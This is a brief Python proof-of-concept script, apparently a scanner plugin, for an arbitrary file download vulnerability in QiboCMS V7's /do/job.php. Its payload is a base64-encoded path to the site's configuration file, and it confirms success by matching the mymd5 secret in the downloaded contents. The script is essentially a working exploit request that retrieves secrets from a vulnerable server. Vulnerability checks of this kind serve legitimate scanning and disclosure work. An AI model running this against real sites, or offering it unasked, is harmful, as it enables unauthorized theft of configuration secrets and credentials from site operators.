#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  QiboCMS V7 /do/job.php 任意文件下载漏洞 POC
Reference  :  http://www.2cto.com/Article/201008/54369.html
"""

import  re

def assign(service, arg):
    if service == "qibocms":
        return True, arg

def audit(arg):
    url = arg
    payload = 'job=download&url=ZGF0YS9jb25maWcucGg8'
    verify_url = url + '/do/job.php?%s' % payload
    code, head, res, errcode, _ = curl.curl(verify_url)
    reg = re.compile("webdb\['mymd5'\]")
    if reg.findall(res):
        security_hole(verify_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('qibocms', 'http://www.example.com/')[1])
